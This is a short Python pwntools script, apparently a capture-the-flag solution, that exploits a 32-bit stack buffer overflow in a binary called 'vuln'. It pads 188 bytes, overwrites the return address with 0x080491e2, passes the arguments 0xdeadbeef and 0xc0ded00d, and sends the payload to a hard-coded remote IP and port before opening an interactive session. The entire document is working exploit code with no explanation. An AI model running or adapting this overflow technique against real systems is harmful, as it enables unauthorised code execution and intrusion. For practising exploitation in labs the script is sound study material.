from pwn import remote, process, p32
def exploit(boolean):
    if boolean:
        r = remote('94.237.56.248', 52595)
    else:
        r = process('./vuln')
    
    payload = b'A' * 188
    payload += p32(0x080491e2)
    payload += b'B'*4
    payload += p32(0xdeadbeef)
    payload += p32(0xc0ded00d)

    # r.recvuntil(':')
    r.sendline(payload)
    r.recvline()
    r.recvline()
    r.interactive()

exploit(True)